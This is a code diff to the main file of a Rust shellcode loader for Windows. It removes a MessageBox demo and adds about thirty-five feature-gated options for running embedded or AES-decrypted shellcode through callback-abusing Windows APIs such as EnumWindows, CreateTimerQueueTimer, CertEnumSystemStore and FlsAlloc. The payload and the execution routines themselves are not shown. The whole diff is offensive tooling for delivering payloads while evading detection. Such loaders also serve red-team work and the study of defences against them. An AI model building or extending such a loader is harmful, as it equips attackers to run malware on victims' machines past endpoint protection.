@@ -1,12 +1,8 @@
-use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
-use windows::core::{PSTR, s};
 use std::ffi::c_void;
+mod execution;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 use std::env;
-
-#[cfg(any(feature = "ShellcodeExecuteDefault", feature = "ShellcodeExecuteFiber"))]
-mod execution;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 mod aes;
@@ -104,16 +100,6 @@ fn main() {
         let (aes_key, aes_iv) = parse_and_validate_aes_args();
 
         //Benign Stuff
-        #[cfg(feature = "messagebox")]
-        unsafe {
-            MessageBoxA(
-                None,
-                s!("Hello World"),
-                s!("Hello"),
-                MB_OK,
-            );
-        }
-
         #[cfg(feature = "calculation")]
         fn calculate()
         {
@@ -126,7 +112,7 @@ fn main() {
         #[cfg(feature = "calculation")]
         calculate();
 
-        // Execute shellcode using default execution method (no encryption)
+        // Execute shellcode without AES decryption
         #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
         {
             let shellcode = ENCPAYLOAD.to_vec();
@@ -136,6 +122,105 @@ fn main() {
             
             #[cfg(feature = "ShellcodeExecuteFiber")]
             execution::shellcode_execute_fiber(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
+            execution::shellcode_execute_createtimerqueuetimer(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
+            execution::shellcode_execute_enumuilanguages(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
+            execution::shellcode_execute_verifierenumerate(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
+            execution::shellcode_execute_enumchildwindows(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
+            execution::shellcode_execute_enumdesktopwindows(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
+            execution::shellcode_execute_enumsystemlocales(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
+            execution::shellcode_execute_certenumsystemstorelocation(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
+            execution::shellcode_execute_enumwindowstations(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
+            execution::shellcode_execute_enumdisplaymonitors(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
+            execution::shellcode_execute_imagegetdigeststream(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+            execution::shellcode_execute_certenumsystemstore(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+            execution::shellcode_execute_enumtimeformats(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+            execution::shellcode_execute_cryptenumoidinfo(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+            execution::shellcode_execute_immenuminputcontext(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+            execution::shellcode_execute_enumpropsw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+            execution::shellcode_execute_enumlanguagegrouplocalesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+            execution::shellcode_execute_symenumprocesses(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+            execution::shellcode_execute_copyfileexw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+            execution::shellcode_execute_enumobjects(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+            execution::shellcode_execute_enumresourcetypesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+            execution::shellcode_execute_enumpagefilesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+            execution::shellcode_execute_enumdirtreew(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+            execution::shellcode_execute_enumfontfamiliesw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+            execution::shellcode_execute_enumdesktopsw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+            execution::shellcode_execute_initonceexecuteonce(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+            execution::shellcode_execute_enumthreadwindows(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+            execution::shellcode_execute_enumerateloadedmodulesw64(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+            execution::shellcode_execute_enumfontsw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+            execution::shellcode_execute_enumcalendarinfow(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+            execution::shellcode_execute_enumwindows(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+            execution::shellcode_execute_enumpwrschemes(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+            execution::shellcode_execute_symfindfileinpath(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+            execution::shellcode_execute_flsalloc(shellcode);
         }
 
         // Execute shellcode with AES decryption
@@ -148,6 +233,105 @@ fn main() {
                 
                 #[cfg(feature = "ShellcodeExecuteFiber")]
                 execution::shellcode_execute_fiber(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
+                execution::shellcode_execute_createtimerqueuetimer(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
+                execution::shellcode_execute_enumuilanguages(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
+                execution::shellcode_execute_verifierenumerate(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
+                execution::shellcode_execute_enumchildwindows(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
+                execution::shellcode_execute_enumdesktopwindows(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
+                execution::shellcode_execute_enumsystemlocales(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
+                execution::shellcode_execute_certenumsystemstorelocation(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
+                execution::shellcode_execute_enumwindowstations(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
+                execution::shellcode_execute_enumdisplaymonitors(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
+                execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+                execution::shellcode_execute_certenumsystemstore(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+                execution::shellcode_execute_enumtimeformats(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+                execution::shellcode_execute_cryptenumoidinfo(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+                execution::shellcode_execute_immenuminputcontext(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+                execution::shellcode_execute_enumpropsw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+                execution::shellcode_execute_enumlanguagegrouplocalesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+                execution::shellcode_execute_symenumprocesses(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+                execution::shellcode_execute_copyfileexw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+                execution::shellcode_execute_enumobjects(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+                execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+                execution::shellcode_execute_enumpagefilesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+                execution::shellcode_execute_enumdirtreew(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+                execution::shellcode_execute_enumfontfamiliesw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+                execution::shellcode_execute_enumdesktopsw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+                execution::shellcode_execute_initonceexecuteonce(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+                execution::shellcode_execute_enumthreadwindows(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+                execution::shellcode_execute_enumerateloadedmodulesw64(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+                execution::shellcode_execute_enumfontsw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+                execution::shellcode_execute_enumcalendarinfow(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+                execution::shellcode_execute_enumwindows(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+                execution::shellcode_execute_enumpwrschemes(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+                execution::shellcode_execute_symfindfileinpath(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+                execution::shellcode_execute_flsalloc(decrypted_shellcode);
             }
         }
 }
